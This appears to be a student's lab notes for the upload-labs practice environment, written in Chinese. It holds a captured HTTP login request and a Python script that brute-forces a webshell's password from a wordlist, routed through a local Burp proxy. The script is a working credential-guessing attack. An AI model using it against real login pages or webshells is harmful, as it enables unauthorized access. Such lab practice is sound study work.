'''
POST /upload-labs-master/upload/pass_auth.php HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
Content-Length: 8
Cache-Control: max-age=0
sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/upload-labs-master/upload/pass_auth.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9


pass=123
'''
'''
http
proxy = {“http”:“xx.xx.xx:8080”}
https
proxy = {“https”:“xx.xx.xx:8080”
如果还是有报错为：“ProxySchemeUnknown: Not supported proxy scheme None”
是因为python版本问题
改为:
http
proxy = {“http”:“http://xx.xx.xx:8080”}
https
proxy = {“https”:“https://xx.xx.xx:8080”}
'''
import requests

def dl(password):

    url='http://127.0.0.1/upload-labs-master/upload/pass_auth.php'

    headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded"
    }   

    data = 'pass={}'.format(password)
    proxies={'http':'http://127.0.0.1:8080'}            #知识点：设置代理，比如burpsuite开代理，抓包，查看发送的包



 
    res = requests.post(url=url,headers=headers,data=data,proxies=proxies)      #知识点：proxies=proxies

    #print(res.text)

    if "<input type=password name=pass>" not in res.text:

        print("输入密码正确，登录成功,webshell密码是：",password)
        return 1                                                            #成功，则返回值1
 


with open('password.txt','r',encoding='utf-8') as f:
    data = f.readlines()
    for ii in data:
        #print(ii.split('\n')[0])
        password=ii.split('\n')[0]
        res = dl(password)
        if res==1:                                                     #知识点：返回值为1，则成功，break打断循环
            break